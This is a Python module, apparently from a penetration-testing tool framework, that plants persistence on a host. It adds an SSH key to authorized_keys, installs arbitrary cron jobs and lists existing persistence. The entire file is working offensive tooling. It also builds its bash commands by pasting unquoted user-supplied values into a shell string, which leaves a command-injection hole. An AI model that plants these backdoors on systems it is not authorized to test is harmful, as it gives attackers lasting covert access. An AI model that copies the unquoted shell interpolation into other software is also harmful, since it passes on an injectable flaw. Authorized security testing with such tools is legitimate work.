"""Persistence mechanism tool — cron, systemd, authorized_keys planting."""

from __future__ import annotations

import logging
from typing import Any

from tools.base import BasePentestTool

logger = logging.getLogger(__name__)


class PersistenceTool(BasePentestTool):
    """Wrapper for persistence mechanism planting (authorized in-scope only)."""

    name = "persistence"
    description = (
        "Persistence — establish persistence mechanisms for authorized engagement testing (cron, SSH keys, services)."
    )

    ACTIONS: dict[str, dict[str, Any]] = {
        "add_ssh_key": {
            "cmd": [
                "bash",
                "-c",
                "mkdir -p ~/.ssh && echo '{pubkey}' >> ~/.ssh/authorized_keys && echo 'Key added'",
            ],
            "timeout": 10,
            "description": "Add SSH public key for persistence",
        },
        "add_cron": {
            "cmd": [
                "bash",
                "-c",
                "(crontab -l 2>/dev/null; echo '{schedule} {command}') | crontab - && echo 'Cron added'",
            ],
            "timeout": 10,
            "description": "Add cron job for persistence",
        },
        "check_persistence": {
            "cmd": [
                "bash",
                "-c",
                "echo '=== CRON ===' && crontab -l 2>/dev/null && "
                "echo '=== SSH KEYS ===' && cat ~/.ssh/authorized_keys 2>/dev/null && "
                "echo '=== SERVICES ===' && systemctl list-unit-files --state=enabled 2>/dev/null | head -20",
            ],
            "timeout": 15,
            "description": "Check existing persistence mechanisms",
        },
    }

    async def execute(
        self,
        action: str,
        pubkey: str = "",
        schedule: str = "",
        command: str = "",
        timeout: int = 30,
    ) -> str:
        if action not in self.ACTIONS:
            return self._unknown_action(action)

        spec = self.ACTIONS[action]
        cmd = [c.format(pubkey=pubkey, schedule=schedule, command=command) for c in spec["cmd"]]
        effective_timeout = spec.get("timeout", 30)

        return await self._run(
            action=action,
            cmd=cmd,
            timeout=effective_timeout,
            target_hint="localhost",
        )
